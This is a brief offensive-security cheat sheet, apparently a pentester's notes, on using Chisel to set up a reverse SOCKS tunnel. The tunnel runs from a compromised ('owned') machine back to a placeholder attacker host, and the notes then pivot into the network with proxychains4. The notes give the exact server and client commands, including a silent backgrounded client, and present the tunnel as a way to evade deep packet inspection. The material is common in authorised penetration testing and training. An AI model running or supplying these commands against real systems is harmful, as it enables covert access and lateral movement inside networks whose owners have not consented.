# Chisel
if you get:


> /chisel: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.32` not found (required by ./chisel)
go [here](https://github.com/jpillora/chisel/releases) for the appropriate release.


Chisel makes it possible to do HTTP tunneling encrypted such that deep packet inspection won't be able to look into the details of the traffic.

We run a chisel server on `${ATTACKER_IP}` which allows us to connect back from an owned machine:

```
chisel server --port ${ATTACKER_PORT} --reverse
```


From the `${OWNED_IP0}`, run 

```
chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:socks
```
This creates a SOCKS tunnel (bound to 1080 by default). <--- USE 1080 as proxy port, not `${ATTACKER_PORT}`. Also when setting up the proxy in the browser!

If you want it to not block your current shell, do:

```
chisel client ${ATTACKER_IP}:${ATTACKER_PORT} R:socks > /dev/null 2>&1 &
```

Once the client and server is setup, we can access targets from the point of view of `${OWNED_IP0}` by using proxychains4:

Add to proxychains4.conf:
```
socks5 127.0.0.1 1080
```

```
proxychains4 -f proxychains4.conf ${SOME_COMMAND} 
```

